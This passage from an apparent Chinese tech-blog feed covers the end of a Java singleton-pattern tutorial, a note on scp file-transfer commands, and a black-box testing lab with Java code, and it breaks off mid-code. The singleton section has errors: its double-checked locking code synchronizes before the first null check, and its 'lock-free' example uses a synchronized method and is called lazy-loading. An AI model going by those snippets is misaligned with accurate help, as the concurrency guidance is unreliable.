class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMainClass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] s)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 通过申明静态方法全局访问获得该单例示例</span></span><br><span class="line">Singleton singleton = Singleton.getInstance();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="同步锁单例模式"><a href="#同步锁单例模式" class="headerlink" title="同步锁单例模式"></a>同步锁单例模式</h4><p>在多线程应用中使用这种模式，如果实例为空，可能存在<strong>两个线程同时调用getInstance方法</strong>的情况。如果发生这种情况，第一个线程会首先使用新构造器实例化单例对象，同时第二个线程也会检查单例实例是否为空，由于第一个线程还没完成单例对象的实例化操作，所以第二个线程会发现这个实例是空的，也会开始实例化单例对象。  </p><p>解决方法：创建一个代码块来检查实例是否空线程安全。在Java中，可以有以下两种方式：</p><ol><li>向getInstance方法的声明中添加synchronized关键字<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="keyword">synchronized</span> <span class="title">getInstance</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></li><li>用synchronized代码块包装if(instance==null)条件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">synchronized (Singleton.class) &#123;</span><br><span class="line">if (instance &#x3D;&#x3D; null)</span><br><span class="line">instance &#x3D; new Singleton();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="拥有双重校验锁机制的同步锁单例模式"><a href="#拥有双重校验锁机制的同步锁单例模式" class="headerlink" title="拥有双重校验锁机制的同步锁单例模式"></a>拥有双重校验锁机制的同步锁单例模式</h4><p>同步锁单例模式虽然能够保证线程安全，但同时带来了延迟。用来检查实例是否被创建的代码是线程同步的，也就是说此代码块在同一时刻只能被一个线程执行，但是同步锁（locking）只有在实例没被创建的情况下才起作用。如果单例实例已经被创建了，那么任何线程都能用非同步的方式获取当前的实例。  </p><p>因此我们设置只有在单例对象未实例化的情况下，才能在synchronized代码块前添加附加条件移动线程安全锁。且instance==null条件需要被检查了两次，保证在synchronized代码块中也要进行一次检查。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line"><span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line"><span class="keyword">if</span> (instance == <span class="keyword">null</span>)</span><br><span class="line">instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="无锁的线程安全模式"><a href="#无锁的线程安全模式" class="headerlink" title="无锁的线程安全模式"></a>无锁的线程安全模式</h4><p>Java中单例模式的最佳实现形式中，类只会加载一次，通过<strong>在声明时直接实例化静态成员</strong>的方式来保证一个类只有一个实例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LockFreeSingleton</span> </span>&#123;</span><br><span class="line"><span class="comment">// 在声明时直接实例化静态成员</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> LockFreeSingleton instance = <span class="keyword">new</span> LockFreeSingleton();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">LockFreeSingleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"Singleton is Instantiated."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> LockFreeSingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doSomething</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"Something is Done."</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>// TODO</p><h4 id="两种单例模式"><a href="#两种单例模式" class="headerlink" title="两种单例模式"></a>两种单例模式</h4><p>按照<strong>实例对象被创建的时机</strong>，可以将单例模式分为两类：</p><ol><li>提前加载单例模式：在应用开始时创建单例实例</li><li>延迟加载单例模式：在getInstance方法首次被调用时才调用单例构造器（例如上文提到的无锁的线程安全模式）</li></ol><h4 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h4><h3 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h3><h3 id="建造者模式"><a href="#建造者模式" class="headerlink" title="建造者模式"></a>建造者模式</h3><h3 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h3><h3 id="对象池模式"><a href="#对象池模式" class="headerlink" title="对象池模式"></a>对象池模式</h3><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>卡马尔米特·辛格（Kamalmeet Singh）. Java设计模式及实践 (Java核心技术系列) (Chinese Edition) (Kindle Location 387). Kindle Edition. </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【Note】SCP文件传输命令</title>
      <link href="/2019/12/26//articles/2019/12/26/1577350330050.html/"/>
      <url>/2019/12/26//articles/2019/12/26/1577350330050.html/</url>
      
        <content type="html"><![CDATA[<h1 id="SCP文件传输命令"><a href="#SCP文件传输命令" class="headerlink" title="SCP文件传输命令"></a>SCP文件传输命令</h1><h2 id="从本地将文件（夹）传输到服务器"><a href="#从本地将文件（夹）传输到服务器" class="headerlink" title="从本地将文件（夹）传输到服务器"></a>从本地将文件（夹）传输到服务器</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> scp -r [localFile_path] [server_username]@[server_ip]:[server_filePlace_path]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> e.g. </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> scp -r ~/Download/testFolder/ root@192.168.1.1:/root</span></span><br></pre></td></tr></table></figure><h2 id="将服务器上的文件（夹）传输到本地"><a href="#将服务器上的文件（夹）传输到本地" class="headerlink" title="将服务器上的文件（夹）传输到本地"></a>将服务器上的文件（夹）传输到本地</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> scp -r [server_username]@[server_ip]:[server_file_path] [localFilePlace_path] </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> e.g. </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> scp -r root@192.168.1.1:/root ~/Download/</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> 小笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件工程】黑盒测试——等价类划分法</title>
      <link href="/2019/12/23//articles/2019/12/23/1577046648204.html/"/>
      <url>/2019/12/23//articles/2019/12/23/1577046648204.html/</url>
      
        <content type="html"><![CDATA[<h1 id="黑盒测试——等价类划分法"><a href="#黑盒测试——等价类划分法" class="headerlink" title="黑盒测试——等价类划分法"></a>黑盒测试——等价类划分法</h1><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191229104834.png"><br>图：封面  </p><h2 id="开发语言及实现平台或实验环境"><a href="#开发语言及实现平台或实验环境" class="headerlink" title="开发语言及实现平台或实验环境"></a>开发语言及实现平台或实验环境</h2><p>在 Windows 7 或 Windows 10 操作系统上，使用 C，C++，C#或 Java 语言 及对应的开发环境(IDE)</p><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ol><li>认识黑盒测试方法中等价类划分测试方法原理 2. 掌握黑盒测试方法中等价类划分测试方法过程</li></ol><h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><ol><li>要求学生理解并掌握弱一般等价类测试和强一般等价类测试方法、原理 和测试过程</li><li>具体为每一组，每组二——五人，根据实验题目编写出对应的 c 语言或 c++语言程序，组间相互交换程序，按黑盒测试的方法进行测试。</li></ol><h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>对编写的实验内容，采用等价类划分测试方法进行黑盒测试。</p><h2 id="实验材料"><a href="#实验材料" class="headerlink" title="实验材料"></a>实验材料</h2><ol><li>三角形问题<br>问题描述:三角形问题接受三个整数，a、b 和 c 作为输入，用作三角<br>形的边。程序的输出是由这三条边确定的三角形类型:等边三角形、等腰 三角形、不等边三角形或非三角形。<br>作为输入:三角形的三条边必须满足如下条件: C1:1&lt;=a&lt;=100<br>C2:1&lt;=b&lt;=100<br>C3:1&lt;=c&lt;=100<br>C4:a&lt;b+c C5:b&lt;a+c C6:c&lt;a+b</li><li>NextDate 函数<br>问题描述:NextDate 是一个由三个变量(月份、日期和年份)的函数。<br>函数返回输入日期后边的那个日期。 作为输入:变量月份、日期和年都具有整数值，满足以下条件。 C1:1&lt;=月份&lt;=12<br>C2:1&lt;=日期&lt;=31<br>C3:1912&lt;=年&lt;=2050</li><li>佣金问题 问题描述:前亚利桑那洲境内的一位步枪销售商销售密苏里州制造商<br>制造的步枪机(lock)、枪托(stock)和枪管(barrel)。<br>枪机卖 45 美元，枪托卖 30 美元，枪管卖 25 美元。 销售商每月至少要售出一支完整的步枪， 且生产限额是大多数销售商在一个月内可销售 70 个枪机、80 个枪托和<br>90 个枪管。 每访问一个镇子后，销售商都给密苏里州步枪制造商发出一份很短的<br>电报，通知几个枪机被售出。这样步枪制造商就知道当月的销售情况，并 计算销售商的佣金如下:<br>不到(含)1000 美元的部分为 10%; 1000(不含)~1800(含)美元的部分为 15%;<br>超过 1800 美元的部分为 20%。 佣金程序生成月份销售报告，汇总售出的枪机、枪托和枪管总数，销<br>售商的总销售额以及佣金。</li></ol><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li>预习相关课堂和实验内容，了解测试对象。</li><li>编写实验材料源代码。</li><li>划分等价类，设计测试用例。</li><li>根据问题需要建立桩模块和驱动模块。 </li><li>测试。</li><li>填写试验报告。</li></ol><h2 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h2><h3 id="三角形问题"><a href="#三角形问题" class="headerlink" title="三角形问题"></a>三角形问题</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> procs;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> java.util.InputMismatchException;</span><br><span class="line">        <span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TriangleProc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> sideA = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> sideB = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> sideC = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TriangleProc</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 函数：验证三角形边的长度范围</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> side</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verifyLengthRange</span><span class="params">(<span class="keyword">int</span> side)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((side &gt;= <span class="number">1</span>) &amp;&amp; (side &lt;= <span class="number">100</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(String.format(<span class="string">"边长 %1d 不满足大于等于1且小于等于 100"</span>, side));</span><br><span class="line">            System.out.println(<span class="string">"=========请重新输入========="</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 函数：验证三角形两边之和大于第三边</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> triangleProc</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verifyFormPrinciple</span><span class="params">(TriangleProc triangleProc)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((triangleProc.sideA + triangleProc.sideB &lt;= triangleProc.sideC)</span><br><span class="line">                || (triangleProc.sideA + triangleProc.sideC &lt;= triangleProc.sideB)</span><br><span class="line">                || (triangleProc.sideB + triangleProc.sideC &lt;= triangleProc.sideA)) &#123;</span><br><span class="line">            System.out.println(String.format(<span class="string">"边长组合为 %1d %2d %3d不满足两边之和大于第三边，是非三角形"</span>,</span><br><span class="line">                    triangleProc.sideA, triangleProc.sideB, triangleProc.sideC));</span><br><span class="line">            System.out.println(<span class="string">"=========请重新输入========="</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"边长组合满足两边之和大于第三边"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">judgeTriangleType</span><span class="params">(TriangleProc triangleProc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (triangleProc.sideA == triangleProc.sideB || triangleProc.sideA == triangleProc.sideC</span><br><span class="line">                || triangleProc.sideB == triangleProc.sideC) &#123;</span><br><span class="line">            <span class="keyword">if</span> (triangleProc.sideA == triangleProc.sideB &amp;&amp; triangleProc.sideB == triangleProc.sideC) &#123;</span><br><span class="line">                String triangleType = <span class="string">"等边三角形"</span>;</span><br><span class="line">                <span class="keyword">return</span> triangleType;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                String triangleType = <span class="string">"等腰三角形"</span>;</span><br><span class="line">                <span class="keyword">return</span> triangleType;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String triangleType = <span class="string">"非等边三角形"</span>;</span><br><span class="line">            <span class="keyword">return</span> triangleType;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">inputEdge</span><span class="params">(Scanner scanner, TriangleProc triangleProc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> tempSideA = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tempSideB = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tempSideC = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.out.println("Welcome to triangle judge program!!!d");</span></span><br><span class="line">        System.out.println(<span class="string">"Please input the side A"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (scanner.hasNext()) &#123;</span><br><span class="line">            tempSideA = scanner.nextInt();</span><br><span class="line">            triangleProc.sideA = tempSideA;</span><br><span class="line">            System.out.println(String.format(<span class="string">"Edge A is %1d. Please input side B"</span>, tempSideA));</span><br><span class="line">            tempSideB = scanner.nextInt();</span><br><span class="line">            triangleProc.sideB = tempSideB;</span><br><span class="line">            System.out.println(String.format(<span class="string">"Edge B is %1d. Please input side C"</span>, tempSideB));</span><br><span class="line">            tempSideC = scanner.nextInt();</span><br><span class="line">            triangleProc.sideC = tempSideC;</span><br><span class="line">            System.out.println(String.format(<span class="string">"Edge C is %1d. The input is finished\n\n"</span>, tempSideC));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> stopFlag = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!stopFlag) &#123;</span><br><span class="line">            <span class="keyword">if</span> (verifyLengthRange(triangleProc.sideA) &amp;&amp; verifyLengthRange(triangleProc.sideB)</span><br><span class="line">                    &amp;&amp; verifyLengthRange(triangleProc.sideC)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (verifyFormPrinciple(triangleProc)) &#123;</span><br><span class="line">                    stopFlag = <span class="keyword">true</span>;</span><br><span class="line">                    String triangleType = judgeTriangleType(triangleProc);</span><br><span class="line">                    System.out.println(String.format(<span class="string">"你输入的三角形类型为：%1s"</span>, triangleType));</span><br><span class="line">                    System.out.println(<span class="string">"========The End========"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    inputEdge(scanner, triangleProc);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 边长不满足两个条件，重新输入</span></span><br><span class="line">                inputEdge(scanner, triangleProc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 主函数，同时也是测试函数</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TriangleProc triangleProc = <span class="keyword">new</span> TriangleProc();</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        triangleProc.inputEdge(scanner, triangleProc);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="NextDate"><a href="#NextDate" class="headerlink" title="NextDate"></a>NextDate</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> procs;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NextDate</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> year = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> month = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> day = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 函数：根据指定的日期，计算下一天</span></span><br><span class="line"><span class="comment">     * 注意：应该在进行日期检查之后再调用</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> year</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> month</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> day</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">nextDateFunction</span><span class="params">(<span class="keyword">int</span> year, <span class="keyword">int</span> month, <span class="keyword">int</span> day)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Calendar calendar = Calendar.getInstance();</span><br><span class="line"></span><br><span class="line">        String yearString = Integer.toString(year);</span><br><span class="line">        String monthString = Integer.toString(month);</span><br><span class="line">        String dayString = Integer.toString(day);</span><br><span class="line"></span><br><span class="line">        String stringDate = yearString + <span class="string">'-'</span> + monthString + <span class="string">'-'</span> + dayString;</span><br><span class="line"></span><br><span class="line">        Date date = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            date = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd"</span>).parse(stringDate);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        calendar.setTime(date);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> dayBefore = calendar.get(Calendar.DATE);</span><br><span class="line">        calendar.set(Calendar.DATE, dayBefore + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        String dayAfter = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd"</span>).format(calendar.getTime());</span><br><span class="line">        <span class="keyword">return</span> dayAfter;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 函数：日期检查函数</span></span><br><span class="line"><span class="comment">     * 检查指定的日期是否符合要求</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> scanner</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> nextDate</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dateCheckFunction</span><span class="params">(Scanner scanner, NextDate nextDate)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Please Input Your Specific Day"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"Please Input the Year(1912 &lt;= year &lt;= 2050): "</span>);</span><br><span class="line">            nextDate.year = scanner.nextInt();</span><br><span class="line">        &#125; <span class="keyword">while</span> (nextDate.year &lt; <span class="number">1912</span> || nextDate.year &gt; <span class="number">2050</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"Please Input the Month(1 &lt;= month &lt;= 12): "</span>);</span><br><span class="line">            nextDate.month = scanner.nextInt();</span><br><span class="line">        &#125; <span class="keyword">while</span> (nextDate.month &lt; <span class="number">1</span> || nextDate.month &gt; <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"Please Input the Day(1 &lt;= day &lt;= 31): "</span>);</span><br><span class="line">            nextDate.day = scanner.nextInt();</span><br><span class="line">        &#125; <span class="keyword">while</span> (nextDate.day &lt; <span class="number">1</span> || nextDate.day &gt; <span class="number">31</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span 